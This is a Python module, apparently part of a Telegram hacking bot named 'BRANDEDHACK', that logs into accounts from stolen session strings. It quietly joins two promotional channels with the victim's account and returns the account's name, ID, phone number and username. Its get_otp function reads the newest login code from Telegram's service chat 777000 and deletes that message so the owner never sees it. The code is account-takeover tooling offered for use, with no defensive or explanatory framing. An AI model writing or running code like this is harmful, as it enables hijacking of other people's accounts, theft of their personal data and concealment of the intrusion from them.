from pyrogram import Client
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest as join

from BRANDEDHACK import API_ID, API_HASH
from BRANDEDHACK.Helpers.data import info


async def user_info(session):
    err = ""
    try:
        if session.endswith("="):
            steve = TelegramClient(StringSession(session), API_ID, API_HASH)
            await steve.connect()

            try:
                await steve(join("@tgsupplyupdates"))
                await steve(join("@techbotss"))
            except:
                pass

            k = await steve.get_me()
            msg = info.format(
                (k.first_name if k.first_name else k.last_name),
                k.id,
                k.phone,
                k.username
            )
            await steve.disconnect()

        else:
            async with Client(
                "stark",
                api_id=API_ID,
                api_hash=API_HASH,
                session_string=session
            ) as stark:

                try:
                    await stark.join_chat("@techbotss")
                    await stark.join_chat("@tgsupplyupdates")
                except:
                    pass

                k = await stark.get_me()
                msg = info.format(
                    (k.first_name if k.first_name else k.last_name),
                    k.id,
                    k.phone_number,
                    k.username
                )

    except Exception as e:
        err = str(e)

    if err:
        return "**ERROR:** " + err

    return msg


# 🔐 OTP FUNCTION — ONLY LAST MESSAGE (1 OTP)
async def get_otp(session):
    err = ""
    otp = ""

    try:
        if session.endswith("="):
            steve = TelegramClient(StringSession(session), API_ID, API_HASH)
            await steve.connect()

            async for msg in steve.iter_messages(777000, limit=1):
                otp = msg.text
                await steve.delete_messages(777000, msg.id)

            await steve.disconnect()

        else:
            async with Client(
                "stark",
                api_id=API_ID,
                api_hash=API_HASH,
                session_string=session
            ) as stark:

                async for msg in stark.get_chat_history(777000, limit=1):
                    otp = msg.text
                    await stark.delete_messages(777000, msg.id)

    except Exception as e:
        err = str(e)

    if err:
        return "**ERROR:** " + err

    return otp
